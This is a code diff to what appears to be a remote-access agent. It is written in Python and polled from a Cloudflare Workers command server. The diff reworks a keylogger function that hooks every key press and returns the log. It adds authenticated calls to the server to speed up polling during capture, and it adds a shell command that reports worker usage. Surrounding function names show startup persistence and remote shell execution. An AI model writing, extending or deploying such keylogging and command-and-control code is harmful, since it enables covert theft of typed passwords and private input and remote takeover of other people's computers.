@@ -260,7 +260,17 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture keyboard input and create a history log."""
+    """
+    Capture keyboard input and return history log.
+
+    OPTIMIZATION: Temporarily enables fast polling (2s) only during execution.
+    - Signals worker to use COMMAND_CHECK_INTERVAL_MIMETIC (2s) instead of normal (5s)
+    - Saves Cloudflare resources by not keeping fast polling active permanently
+    - Execution time: 2 seconds maximum
+    - Frontend waits: 6 seconds (40 × 150ms)
+    """
+    global device_id
+
     try:
         import keyboard
     except ImportError:
@@ -277,12 +287,26 @@ def mimetic_keylogger():
         except Exception as e:
             return f"Error installing keyboard: {str(e)}"
 
+    # Enable mimetic mode (tells worker to use fast polling)
+    if device_id:
+        try:
+            req = urllib.request.Request(
+                LOG_AUTH_URL + f"/mimetic-mode?deviceId={device_id}&enabled=true",
+                headers={"Authorization": "Bearer " + AGENT_TOKEN, "User-Agent": USER_AGENT},
+                method="POST",
+            )
+            urllib.request.urlopen(req, timeout=5)
+            print("[mimetic] Fast polling enabled", flush=True)
+        except Exception as e:
+            print(f"[mimetic] Could not enable fast polling: {str(e)}", flush=True)
+
     try:
         log = []
         stop_event = threading.Event()
 
         def on_key_press(event):
             key_name = event.name
+            # Map special keys to brackets format
             if key_name == 'space':
                 log.append('[SPACE]')
             elif key_name == 'enter':
@@ -300,26 +324,25 @@ def mimetic_keylogger():
             elif key_name == 'alt':
                 log.append('[ALT]')
             elif len(key_name) == 1:
-                log.append(key_name)
+                log.append(key_name)  # Regular character
             else:
-                log.append(f'[{key_name.upper()}]')
+                log.append(f'[{key_name.upper()}]')  # Other special keys
 
+            # ESC key stops the capture immediately
             if key_name == 'esc':
                 stop_event.set()
-                return False
+                return False  # Remove this hook
 
         keyboard.on_press(on_key_press)
 
-        # Wait for ESC with 5 second timeout (to match frontend timeout)
-        stopped = stop_event.wait(timeout=5)
+        # Wait for ESC or 2-second timeout
+        stopped = stop_event.wait(timeout=2)
         keyboard.unhook_all()
 
         result = ''.join(log)
-        if stopped:
-            return result if result else "No keys recorded"
-        else:
-            return f"Timeout (60s): {result if result else 'No keys recorded'}"
+        return result if result else "No keys recorded"
     except KeyboardInterrupt:
+        # Handle if process is interrupted
         try:
             keyboard.unhook_all()
         except:
@@ -328,6 +351,19 @@ def mimetic_keylogger():
         return result if result else "No keys recorded"
     except Exception as e:
         return f"Error: {str(e)}"
+    finally:
+        # Disable mimetic mode (return to normal polling)
+        if device_id:
+            try:
+                req = urllib.request.Request(
+                    LOG_AUTH_URL + f"/mimetic-mode?deviceId={device_id}&enabled=false",
+                    headers={"Authorization": "Bearer " + AGENT_TOKEN, "User-Agent": USER_AGENT},
+                    method="POST",
+                )
+                urllib.request.urlopen(req, timeout=5)
+                print("[mimetic] Fast polling disabled", flush=True)
+            except Exception as e:
+                print(f"[mimetic] Could not disable fast polling: {str(e)}", flush=True)
 
 
 def restart_agent():
@@ -959,6 +995,32 @@ def execute_shell_command(cmd_str):
             try:
                 result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
                 return result.stdout.strip() if result.stdout else "Unable to retrieve network config"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle usage command - show Cloudflare Workers usage
+        if cmd_lower == "usage":
+            try:
+                req = urllib.request.Request(
+                    LOG_AUTH_URL + "/usage",
+                    headers={
+                        "Authorization": "Bearer " + INTERNAL_TOKEN,
+                        "User-Agent": USER_AGENT,
+                    },
+                    method="GET",
+                )
+                resp = urllib.request.urlopen(req, timeout=10).read()
+                data = json.loads(resp.decode("utf-8"))
+                if data.get("ok"):
+                    usage_info = data.get("usage", {})
+                    return f"""Cloudflare Workers Usage:
+  Estimated Requests: {usage_info.get('estimatedRequests', 'N/A')}
+  Daily Limit: {usage_info.get('dailyLimit', 'N/A')}
+  Usage: {usage_info.get('percentageUsed', 'N/A')}
+  Active Devices: {usage_info.get('activeDevices', 'N/A')}
+  Note: {usage_info.get('note', 'N/A')}"""
+                else:
+                    return f"Error retrieving usage: {data.get('error', 'Unknown error')}"
             except Exception as e:
                 return f"Error: {str(e)}"
 
